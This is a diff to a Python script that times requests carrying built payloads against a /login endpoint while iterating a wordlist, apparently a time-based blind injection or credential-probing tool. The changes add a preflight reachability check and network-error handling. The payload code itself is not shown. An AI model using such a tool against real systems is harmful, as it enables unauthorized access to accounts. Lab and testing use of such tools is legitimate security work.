@@ -2,6 +2,7 @@ import argparse
 import time
 import urllib.parse
 import urllib.request
+from urllib.error import URLError
 
 
 def build_payload(username: str, password: str, delay: int) -> str:
@@ -59,9 +60,23 @@ def main() -> None:
         default=15,
         help="HTTP timeout in seconds (should be > delay).",
     )
+    parser.add_argument(
+        "--preflight",
+        action="store_true",
+        help="Run a quick connectivity check before probing.",
+    )
     args = parser.parse_args()
 
     login_url = f"{args.base_url.rstrip('/')}/login"
+
+    if args.preflight:
+        try:
+            request = urllib.request.Request(login_url, method="GET")
+            with urllib.request.urlopen(request, timeout=5):
+                print("Preflight OK: login page reachable.")
+        except URLError as exc:
+            print(f"Preflight failed: {exc}. Is the app running on {login_url}?")
+            return
 
     with open(args.wordlist, "r", encoding="utf-8") as handle:
         for line in handle:
@@ -75,6 +90,11 @@ def main() -> None:
             except TimeoutError:
                 print(
                     "Request timed out. Increase --timeout or check server reachability."
+                )
+                return
+            except URLError as exc:
+                print(
+                    f"Request failed: {exc}. Check that the server is reachable."
                 )
                 return
             print(f"Tried {candidate!r}: {elapsed:.2f}s")
